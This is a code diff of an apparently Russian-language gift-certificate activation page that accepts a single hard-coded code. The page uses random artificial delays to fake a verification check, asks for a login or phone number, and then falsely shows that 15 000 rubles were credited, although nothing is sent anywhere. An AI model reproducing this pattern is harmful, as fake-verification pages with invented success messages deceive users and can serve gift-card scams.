@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>KIBERPRIDE — активация сертификата</title>
   <meta name="description" content="Активация подарочного сертификата. Введите код, логин или телефон."/>
+  <!-- Open Graph / Twitter (для превью без суммы) -->
   <meta property="og:title" content="KIBERPRIDE — активация" />
   <meta property="og:description" content="Введите код сертификата, затем логин или телефон для активации." />
   <meta property="og:type" content="website" />
@@ -49,27 +50,35 @@
     input:focus{border-color:var(--brand); box-shadow:0 0 0 4px rgba(27,72,240,.12)}
     .row{display:flex; gap:12px; flex-wrap:wrap}
     .row .field{flex:1 1 220px}
+
+    /* Основные кнопки (широкие) */
     .btn{
+      cursor:pointer; user-select:none; height:52px; border-radius:16px; border:0; width:100%;
+      font-weight:800; letter-spacing:.2px; font-size:16px;
+      background:linear-gradient(120deg, var(--accent), #ff7a70); color:#fff; box-shadow:0 12px 30px rgba(255,61,46,.35);
+      transition: transform .06s, filter .2s;
+    }
+    .btn:hover{filter:brightness(1.05)} .btn:active{transform:translateY(1px)} .btn[disabled]{opacity:.65; cursor:not-allowed}
+
+    /* Узкая кнопка */
+    .btn-small{
       cursor:pointer; user-select:none; height:52px; border-radius:16px; border:0;
       font-weight:800; letter-spacing:.2px; font-size:16px;
-      background:linear-gradient(120deg, var(--accent), #ff7a70);
-      color:#fff; box-shadow:0 12px 30px rgba(255,61,46,.35);
+      background:linear-gradient(120deg, var(--accent), #ff7a70); color:#fff; box-shadow:0 12px 30px rgba(255,61,46,.35);
       transition: transform .06s, filter .2s;
-      width:100%;
       display:inline-flex; align-items:center; justify-content:center;
-      text-decoration:none; padding:0 18px;
+      padding:0 28px; margin:0 auto; width:auto; max-width:80%;
+      text-decoration:none; text-align:center;
     }
-    .btn:hover{filter:brightness(1.05)}
-    .btn:active{transform:translateY(1px)}
-    .btn[disabled]{opacity:.65; cursor:not-allowed}
+    .btn-small:hover{filter:brightness(1.05)} .btn-small:active{transform:translateY(1px)}
+
     .legal{font-size:12px; color:var(--text-weak); text-align:center; padding:10px 18px 20px}
     .status{display:none; gap:10px; align-items:flex-start; border-radius:14px; padding:14px; margin-top:12px}
     .status.show{display:flex}
     .status.info{background:#eff6ff; border:1px solid #dbeafe; color:#1e3a8a}
     .status.ok{background:#ecfdf3; border:1px solid #cdebd6; color:#065f46}
     .status.err{background:#fef2f2; border:1px solid #fecaca; color:#991b1b}
-    .status .dot{width:12px;height:12px;border-radius:50%;margin-top:4px; animation:pulse 1s infinite;}
-    @keyframes pulse{0%{opacity:.4}50%{opacity:1}100%{opacity:.4}}
+    .status .dot{width:12px;height:12px;border-radius:50%;margin-top:4px}
     .status.info .dot{background:#3b82f6}
     .status.ok .dot{background:var(--ok)}
     .status.err .dot{background:var(--error)}
@@ -77,8 +86,6 @@
     .footer-brand strong{color:#fff}
     .art{width:var(--card-w); max-width:680px; margin:0 auto -24px; display:block}
     .hidden{display:none}
-    .final{display:none; padding:10px 0 8px; text-align:center}
-    .final.show{display:block}
   </style>
 </head>
 <body>
@@ -95,19 +102,21 @@
       <div class="content">
         <span id="amountBadge" class="badge"><span>Сумма:</span> <span class="amount">15 000 ₽</span></span>
 
-        <div class="h1">Шаг 1. Код сертификата</div>
-        <p class="p">Введите код формата <strong>KP-XXXX-XXXX-XXXX</strong>. Если пришли по персональной ссылке, поле заполнится автоматически.</p>
+        <div id="step1">
+          <div class="h1">Шаг 1. Код сертификата</div>
+          <p class="p">Введите код формата <strong>KP-XXXX-XXXX-XXXX</strong>. Если пришли по персональной ссылке, поле заполнится автоматически.</p>
 
-        <form id="codeForm" novalidate>
-          <div class="row">
-            <div class="field" style="flex:1 1 100%">
-              <label for="giftcode">Код</label>
-              <input id="giftcode" name="giftcode" type="text" placeholder="KP-XXXX-XXXX-XXXX" autocomplete="one-time-code" />
+          <form id="codeForm" novalidate>
+            <div class="row">
+              <div class="field" style="flex:1 1 100%">
+                <label for="giftcode">Код</label>
+                <input id="giftcode" name="giftcode" type="text" placeholder="KP-XXXX-XXXX-XXXX" autocomplete="one-time-code" />
+              </div>
             </div>
-          </div>
-          <button class="btn" type="submit" id="checkBtn">Проверить код</button>
-          <div id="codeStatus" class="status info"><div class="dot"></div><div id="codeStatusText">Проверяем код…</div></div>
-        </form>
+            <button class="btn" type="submit" id="checkBtn">Проверить код</button>
+            <div id="codeStatus" class="status info"><div class="dot"></div><div id="codeStatusText">Проверяем код…</div></div>
+          </form>
+        </div>
 
         <div id="step2" class="hidden">
           <div class="h1">Шаг 2. Активация</div>
@@ -125,21 +134,19 @@
               </div>
             </div>
             <button class="btn" type="submit">Активировать</button>
-
-            <div id="activateStatus" class="status info"><div class="dot"></div><div id="activateStatusText">Активируем код…</div></div>
             <div id="success" class="status ok"><div class="dot"></div><div><strong>Готово!</strong> Сертификат будет привязан к вашему аккаунту.</div></div>
           </form>
         </div>
 
-        <!-- Финальный экран -->
-        <div id="finalAction" class="final">
-          <a id="cabinetBtn" class="btn" href="#">Перейти в личный кабинет</a>
-
+        <!-- Финальный блок -->
+        <div id="finalAction" class="hidden" style="text-align:center; margin-top:20px;">
+          <a id="cabinetBtn" class="btn-small" href="#">Перейти в личный кабинет</a>
           <div id="credited" class="status ok show" style="margin-top:16px;">
             <div class="dot"></div>
             <div><strong>Успех!</strong> На ваш баланс было зачислено 15 000 ₽.</div>
           </div>
         </div>
+
       </div>
 
       <div class="legal">Нажимая кнопку, вы соглашаетесь с обработкой персональных данных и условиями оферты.</div>
@@ -150,57 +157,51 @@
 
   <script>
     const VALID_CODE = 'KP-1421-DSCR-4124';
-    const CABINET_URL = 'https://kiberpride.ru/'; // замени на адрес личного кабинета
 
     const codeForm = document.getElementById('codeForm');
     const giftInput = document.getElementById('giftcode');
     const codeStatus = document.getElementById('codeStatus');
+    const codeStatusText = document.getElementById('codeStatusText');
     const amountBadge = document.getElementById('amountBadge');
+    const step1 = document.getElementById('step1');
     const step2 = document.getElementById('step2');
+    const finalAction = document.getElementById('finalAction');
 
     const actForm = document.getElementById('activateForm');
     const phoneInput = document.getElementById('phone');
     const loginInput = document.getElementById('login');
     const success = document.getElementById('success');
-    const activateStatus = document.getElementById('activateStatus');
 
-    const finalAction = document.getElementById('finalAction');
-    const cabinetBtn = document.getElementById('cabinetBtn');
-    cabinetBtn.href = CABINET_URL;
-
-    const showStatus = (el, type, text) => {
-      el.className = 'status ' + type + ' show';
-      const textEl = el.querySelector('div:last-child');
-      if (textEl) textEl.textContent = text;
+    const showStatus = (type, text) => {
+      codeStatus.className = 'status ' + type + ' show';
+      codeStatusText.textContent = text;
     };
-    const hideStatus = (el) => { el.className = 'status'; };
-
     const normalizeCode = v => (v || '').toUpperCase().trim();
     const cleanPhone = v => (v || '').replace(/[^\d+]/g,'');
 
-    // Проверка кода (6–9 секунд)
+    // Проверка кода
     codeForm.addEventListener('submit', (e) => {
       e.preventDefault();
       const code = normalizeCode(giftInput.value);
-      if (!code) { showStatus(codeStatus, 'err', 'Введите код сертификата.'); return; }
+      if (!code) { showStatus('err', 'Введите код сертификата.'); return; }
 
-      showStatus(codeStatus, 'info', 'Проверяем код…');
+      showStatus('info', 'Проверяем код…');
       document.getElementById('checkBtn').disabled = true;
 
       const delay = 6000 + Math.floor(Math.random() * 3000);
       setTimeout(() => {
         if (code === VALID_CODE) {
-          showStatus(codeStatus, 'ok', 'Код принят! Доступен сертификат на 15\u00A0000 \u20BD.');
+          showStatus('ok', 'Код принят! Доступен сертификат на 15\u00A0000 \u20BD.');
           amountBadge.classList.add('show');
           step2.classList.remove('hidden');
         } else {
-          showStatus(codeStatus, 'err', 'Код недействителен.');
+          showStatus('err', 'Код недействителен.');
           document.getElementById('checkBtn').disabled = false;
         }
       }, delay);
     });
 
-    // Активация (ожидание ~5 секунд), затем показ финального экрана
+    // Активация
     actForm?.addEventListener('submit', (e) => {
       e.preventDefault();
       const phone = cleanPhone(phoneInput.value);
@@ -212,28 +213,21 @@
         alert('Укажите логин (мин. 3 символа) или телефон.');
         return;
       }
-
-      showStatus(activateStatus, 'info', 'Активируем код…');
+      console.log('Gift claim payload', { login, phone, code: VALID_CODE });
+      success.classList.add('show');
       actForm.querySelector('.btn').disabled = true;
+      actForm.querySelector('.btn').textContent = 'Заявка отправлена';
 
+      // Через 10–15 секунд показать финальный экран
+      const delay = 10000 + Math.floor(Math.random() * 5000);
       setTimeout(() => {
-        hideStatus(activateStatus);
-        success.classList.add('show');
-        actForm.querySelector('.btn').textContent = 'Заявка отправлена';
-
-        // Через 10–15 секунд скрываем шаги и показываем финальный экран
-        const finishDelay = 10000 + Math.floor(Math.random() * 5000);
-        setTimeout(() => {
-          document.querySelectorAll('#codeForm, #step2, .h1, .p, #amountBadge').forEach(el => el?.classList.add('hidden'));
-          finalAction.classList.add('show');
-          // Автофокус на кнопке для удобства
-          document.getElementById('cabinetBtn').focus();
-        }, finishDelay);
-
-      }, 5000);
+        step1.classList.add('hidden');
+        step2.classList.add('hidden');
+        finalAction.classList.remove('hidden');
+      }, delay);
     });
 
-    // Автозаполнение кода из URL: /<code> или ?code=<code>
+    // Автозаполнение кода из URL
     (function prefillFromURL(){
       const url = new URL(window.location.href);
       const byQuery = url.searchParams.get('code');
